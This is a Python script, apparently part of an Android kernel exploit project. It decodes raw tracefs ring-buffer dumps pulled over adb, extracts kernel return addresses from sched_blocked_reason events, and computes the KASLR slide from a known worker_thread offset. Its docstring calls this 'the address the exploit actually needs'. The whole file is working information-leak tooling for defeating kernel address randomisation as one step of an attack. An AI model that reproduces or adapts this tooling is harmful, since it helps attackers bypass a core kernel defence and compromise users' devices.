#!/usr/bin/env python3
"""Decode sched_blocked_reason events out of a raw tracefs ring-buffer dump.

The tracefs text format prints `caller=worker_thread+0xa0/0x430`, which hides the
address the exploit actually needs.  trace_pipe_raw exposes the ring-buffer pages
verbatim: 4096-byte pages, a 16-byte page header, then ring_buffer_event headers
(type_len in the low 5 bits; 30 means the length follows in the next u32; 31 is
a time-extend record).  The event payload starts after that header and the
caller field sits at payload offset 16.

For each distinct caller this prints the address minus the image text base, and
whether it is exactly `--worker-off` plus a 64 KiB multiple inside the target
slide range.  Only the worker_thread return address should satisfy that; other
kernel threads produce unrelated offsets and are printed as `no`.

Usage:
  tools/parse_raw.py cpu0.raw --worker-off 0xdb39c
  adb exec-out "cat /sys/kernel/tracing/trace_pipe_raw" > cpu0.raw   # see tools/verify-tracefs.sh
"""
import argparse
import struct
from collections import Counter
from pathlib import Path

PAGE = 4096
PAGE_HEADER = 16
EVENT_TYPE = 106  # sched_blocked_reason, verified per image in docs/PORT-STATUS.md


def u32(data, offset):
    return struct.unpack_from("<I", data, offset)[0]


def u64(data, offset):
    return struct.unpack_from("<Q", data, offset)[0]


def events(data):
    found = []
    for page_start in range(0, len(data) - PAGE + 1, PAGE):
        offset = page_start + PAGE_HEADER
        while offset + 4 <= page_start + PAGE:
            header = u32(data, offset)
            if header == 0:
                break
            type_len = header & 0x1F
            if type_len == 0:
                break
            if type_len == 31:
                offset += 8
                continue
            length = u32(data, offset + 4) if type_len == 30 else type_len * 4
            if length < 4 or offset + length > page_start + PAGE:
                break
            payload = offset + 4
            if length >= 32 and struct.unpack_from("<H", data, payload)[0] == EVENT_TYPE:
                found.append((u64(data, payload + 16),
                              struct.unpack_from("<i", data, payload + 8)[0]))
            offset += length
    return found


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("raw", nargs="+", help="raw tracefs page dumps")
    parser.add_argument("--base", type=lambda s: int(s, 0), default=0xFFFFFFC008000000,
                        help="KIMAGE_TEXT_BASE (default: %(default)#x)")
    parser.add_argument("--worker-off", type=lambda s: int(s, 0), default=0x000DB39C,
                        help="SLIDE_TRACEFS_WORKER_CALLER_OFF (default: %(default)#x)")
    parser.add_argument("--slide-max", type=lambda s: int(s, 0), default=0x1F0000,
                        help="highest KASLR slide to accept (default: %(default)#x)")
    args = parser.parse_args()

    records = []
    for path in args.raw:
        data = Path(path).read_bytes()
        if len(data) % PAGE:
            print(f"{path}: {len(data) % PAGE} trailing bytes ignored")
        records.extend(events(data))

    print(f"events={len(records)}")
    print(f"{'caller':>20} {'image_off':>12} {'count':>6}  worker match")
    for caller, count in Counter(c for c, _ in records).most_common():
        image_offset = (caller - args.base) & 0xFFFFFFFFFFFFFFFF
        delta = (image_offset - args.worker_off) & 0xFFFFFFFFFFFFFFFF
        if delta % 0x10000 == 0 and delta <= args.slide_max:
            verdict = f"YES slide={delta:#x}"
        else:
            verdict = "no"
        print(f"0x{caller:016x} 0x{image_offset:010x} {count:6d}  {verdict}")

    pids = Counter(pid for _, pid in records)
    print(f"\ndistinct pids={len(pids)}")


if __name__ == "__main__":
    main()
